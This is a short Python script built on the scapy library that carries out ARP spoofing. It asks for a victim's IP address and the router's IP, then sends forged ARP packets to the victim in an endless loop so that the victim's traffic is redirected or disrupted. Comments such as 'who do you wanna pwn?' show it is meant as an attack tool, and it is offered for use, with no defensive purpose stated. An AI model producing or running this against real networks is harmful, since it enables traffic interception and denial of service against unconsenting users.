#!/usr/bin/env python3
from scapy.all import *

op = 1 # Op code 1 for ARP requests
victim=input('Enter the target IP to hack: ') # who do you wanna pwn?

spoof = input('Enter the routers IP: ') # you can find this from your network settings
# on Mac, should be Network>Advanced>TCP/IP and then the IP next to "Router: "

arp=ARP(op=op,psrc=spoof,pdst=victim)

while 1:
  send(arp)

# TO STOP THE SCRIPT, hold down Ctrl-C for a bit and it should stop
